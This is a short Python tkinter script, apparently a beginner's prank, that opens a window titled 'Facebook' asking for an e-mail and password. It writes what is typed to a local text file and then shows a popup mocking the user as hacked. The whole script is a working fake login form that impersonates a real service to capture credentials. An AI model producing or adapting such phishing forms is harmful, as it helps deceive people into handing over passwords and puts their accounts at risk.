import tkinter
from tkinter import *
from tkinter import messagebox

root= Tk()

def getit():
    a=ent_get.get()
    b=entget.get()
    f=open(r"C:\Users\cheri\Desktop\Coding\PYTHON\Text Files\password.txt",'w')
    f.write("User's username is "+ b +' and their password is '+ a)
    f.close()
    messagebox.showinfo('Lol','You have been hacked dumb!')

var1 = StringVar()
var1.set("Enter your E-Mail:")
lbl1 = Label(root, textvariable=var1).place(x=10 , y=10)

entget= StringVar()
ent=Entry(root,width=40,textvariable=entget).place(x=130,y=10)

var2 = StringVar()
var2.set("Enter your Password:")
lbl2 = Label(root, textvariable=var2).place(x=10 , y=40)

ent_get= StringVar()
ent=Entry(root,width=40,textvariable= ent_get).place(x=130,y=40)


btn=Button(root,text='Enter',command=getit).place(x=190,y=320)


root.geometry('400x400')
root.title('Facebook')

root.mainloop()